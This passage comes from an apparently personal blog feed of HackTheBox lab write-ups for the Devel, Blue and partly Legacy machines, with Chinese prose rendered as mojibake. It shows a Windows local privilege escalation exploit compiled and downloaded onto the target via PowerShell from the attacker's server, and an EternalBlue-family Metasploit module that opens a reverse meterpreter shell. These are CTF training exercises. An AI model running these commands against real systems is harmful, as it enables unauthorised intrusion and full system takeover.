class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure></div><p>çµæœé€²å»ä¹‹å¾Œé€£ user flag çš„æ¬Šé™éƒ½é‚„æ²’æœ‰ï¼Œç„¶å¾Œä¹Ÿç™¼ç¾é€™å°ä¼ºæœå™¨æ˜¯ x86 é›£æ€ªå‰›å‰›çš„ç¬¬ä¸€æ¬¡çš„ payload ä¸æœƒéï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;<span class="built_in">cd</span> babis</span><br><span class="line"><span class="built_in">cd</span> babis</span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 137F-3971</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users</span><br><span class="line"></span><br><span class="line">18/03/2017  01:16 ï¿½ï¿½    &lt;DIR&gt;          .</span><br><span class="line">18/03/2017  01:16 ï¿½ï¿½    &lt;DIR&gt;          ..</span><br><span class="line">18/03/2017  01:16 ï¿½ï¿½    &lt;DIR&gt;          Administrator</span><br><span class="line">17/03/2017  04:17 ï¿½ï¿½    &lt;DIR&gt;          babis</span><br><span class="line">18/03/2017  01:06 ï¿½ï¿½    &lt;DIR&gt;          Classic .NET AppPool</span><br><span class="line">14/07/2009  09:20 ï¿½ï¿½    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               6 Dir(s)   4.396.625.920 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users&gt;systeminfo </span><br><span class="line">systeminfo </span><br><span class="line"></span><br><span class="line">Host Name:                 DEVEL</span><br><span class="line">OS Name:                   Microsoft Windows 7 Enterprise </span><br><span class="line">OS Version:                6.1.7600 N/A Build 7600</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          babis</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                55041-051-0948536-86302</span><br><span class="line">Original Install Date:     17/3/2017, 4:17:31 ï¿½ï¿½</span><br><span class="line">System Boot Time:          28/10/2024, 1:26:00 ï¿½ï¿½</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware Virtual Platform</span><br><span class="line">System Type:               X86-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz</span><br><span class="line">BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             el;Greek</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span><br><span class="line">Total Physical Memory:     3.071 MB</span><br><span class="line">Available Physical Memory: 2.456 MB</span><br><span class="line">Virtual Memory: Max Size:  6.141 MB</span><br><span class="line">Virtual Memory: Available: 5.535 MB</span><br><span class="line">Virtual Memory: In Use:    606 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    HTB</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: Local Area Connection 4</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     10.129.0.1</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.129.151.61</span><br><span class="line">                                 [02]: fe80::d981:e519:55b8:816</span><br><span class="line">                                 [03]: dead:beef::8870:1e16:d944:cf4e</span><br><span class="line">                                 [04]: dead:beef::d981:e519:55b8:816</span><br></pre></td></tr></table></figure></div><p>å¾ä¸Šé¢çš„è³‡è¨Šæˆ‘å€‘é‚„å¯ä»¥å¾—çŸ¥ä½œæ¥­ç³»çµ±çš„ç‰ˆæœ¬å¾ˆèˆŠï¼Œæ˜¯ Windows 7 æœ€æ—©æœŸçš„ç‰ˆæœ¬ï¼Œå·²çŸ¥å­˜åœ¨è¨±å¤šæ¼æ´ã€‚<br>æˆ‘å€‘å¯ä»¥é€é <code>searchsploit</code> ä¾†æ‰¾å°‹ Exploit Database (exploit-db) ä¸­çš„æ¼æ´è³‡æ–™ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼Œæˆ‘å€‘å¯ä»¥å…ˆå» google win7 x86 ææ¬Šæœ‰å“ªäº›ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_exploitDB.png"                      alt="db"                ><br>ç„¶å¾Œåœ¨ä¸Šé¢å¯ä»¥çœ‹åˆ°å·¦ä¸Šè§’æœ‰ä¸€å€‹ EDB-ID æˆ‘å€‘å¯ä»¥é€™æ¨£ç”¨ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ searchsploit -u <span class="comment">## update</span></span><br><span class="line">â””â”€â”€â•¼ [â˜…]$ searchsploit -m 47176</span><br><span class="line">  Exploit: Microsoft Windows 7 build 7601 (x86) - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/47176</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/windows_x86/local/47176.cpp</span><br><span class="line">    Codes: CVE-2019-1132</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/kazma/47176.cpp</span><br></pre></td></tr></table></figure></div><p>çµæœä»–æ²’æœ‰å¯«è¦æ€éº¼ç·¨è­¯é‡åˆ°å¾ˆå¤šç’°å¢ƒå•é¡Œï¼Œæ±ºå®šæ›å¦å¤–ä¸€å€‹æœ‰å¯«ç·¨è­¯æ–¹å¼çš„ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ searchsploit -m 40564</span><br><span class="line">  Exploit: Microsoft Windows (x86) - <span class="string">&#x27;afd.sys&#x27;</span> Local Privilege Escalation (MS11-046)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/40564</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c</span><br><span class="line">    Codes: CVE-2011-1249, MS11-046</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/kazma/40564.c</span><br><span class="line"></span><br><span class="line">â”Œâ”€[eu-dedivip-1]â”€[10.10.14.63]â”€[kazma@htb-wnzfbgnuq9]â”€[~]</span><br><span class="line">â””â”€â”€â•¼ [â˜…]$ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32</span><br></pre></td></tr></table></figure></div><p>ç„¶å¾Œç”¨ python çš„ http.server è®“æˆ‘å€‘å¾ç›®æ¨™æ©Ÿå™¨è¼‰ä¸‹ payload:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ python -m http.server </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure></div><p>å¾ç›®æ¨™æ©Ÿå™¨è¼‰ä¸‹ä¾†ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;powershell -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63:8000/40564.exe&#x27;, &#x27;c:\Users\Public\Downloads\40564.exe&#x27;)&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63:8000/40564.exe&#x27;, &#x27;c:\Users\Public\Downloads\40564.exe&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œè…³æœ¬ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\Public\Downloads&gt;40564.exe</span><br><span class="line">40564.exe</span><br><span class="line"></span><br><span class="line">c:\Windows\System32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure></div><p>æ‹¿ä¸‹æ©Ÿå™¨ï¼</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…ˆ &lt;code&gt;nmap&lt;/code&gt; ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Bash&quot;&gt;&lt;figure class=&quot;iseeu highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Blue Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Blue-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Blue-Writeup/</id>
    <published>2024-10-27T11:08:02.748Z</published>
    <updated>2024-10-27T11:23:08.579Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>å…ˆ <code>nmap</code> ä¸€ä¸‹ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ nmap -sV --script vuln 10.129.208.2</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:09 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.208.2</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 991 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 89.41 seconds</span><br></pre></td></tr></table></figure></div><p>æ„Ÿè¦ºè·Ÿ legacy 87% åƒï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ msfconsole</span><br><span class="line">Metasploit tip: The use <span class="built_in">command</span> supports fuzzy searching to try and </span><br><span class="line"><span class="keyword">select</span> the intended module, e.g. use kerberos/get_ticket or use </span><br><span class="line">kerberos forge silver ticket</span><br><span class="line">                                                  </span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%</span><br><span class="line">%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%</span><br><span class="line">%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%</span><br><span class="line">%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%</span><br><span class="line">%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2017-0143</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 1 </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; <span class="built_in">set</span> rhost 10.129.208.2</span><br><span class="line">rhost =&gt; 10.129.208.2</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.208.2:445 - Target OS: Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[*] 10.129.208.2:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 10.129.208.2:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 10.129.208.2:445 - Selecting PowerShell target</span><br><span class="line">[*] 10.129.208.2:445 - Executing the payload...</span><br><span class="line">[+] 10.129.208.2:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.208.2</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.208.2:49158) at 2024-10-27 06:13:43 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\Windows\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div><p>æ‹¿ä¸‹ rootã€‚</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blue_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Recon&quot;&gt;&lt;a href=&quot;#Recon&quot; class=&quot;headerlink&quot; title=&quot;Recon&quot;&gt;&lt;/a&gt;Recon&lt;/h2&gt;&lt;p&gt;å…ˆ &lt;code&gt;nmap&lt;/code&gt; ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&quot;highlight-containe</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Legacy Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Legacy-Writeup/</id>
    <published>2024-10-27T09:38:00.249Z</published>
    <updated>2024-10-27T11:10:12.335Z</updated>
    
    <content type="html"><![CDATA[<p>å¾ä»Šå¤©é–‹å§‹æƒ³è¦åœ¨è€ƒ OSCP å‰åˆ·ä¸€ä¸‹ HackTheBox ä¸­è·Ÿ OSCP è­‰ç…§æ¯”è¼ƒç›¸é—œçš„æ©Ÿå™¨ï¼š<br><a class="link"   href="https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation" >https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>ä»Šå¤©è¦æ‰“çš„æ˜¯ Windows çš„ legacy</p><p>å…ˆ <code>nmap</code> æƒä¸€ä¸‹</p><ul><li><code>-sV</code> æ˜¯æœå‹™ç‰ˆæœ¬åµæ¸¬</li><li><code>--script=vuln</code> æœƒé‡å°å·²çŸ¥æ¼æ´é€²è¡Œæª¢æŸ¥<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ nmap -sV --script=vuln 10.129.152.110</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:21 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.152.110</span><br><span class="line">Host is up (0.078s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 23.14 seconds</span><br></pre></td></tr></table></figure></div>æƒæçµæœæ˜¯æœ‰ä¸‰å€‹æœå‹™é–‹å•Ÿï¼Œå…¶ä¸­æœ‰ smb-vuln-ms17-010 çš„æ¼æ´ï¼Œæ˜¯ä¸€å€‹ SMB çš„ RCE æ´ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ msfconsole æ‰ä»–ã€‚<br>çµæœä¸€ç›´é‡åˆ°é€™å€‹å•é¡Œï¼š<div class="highlight-container" 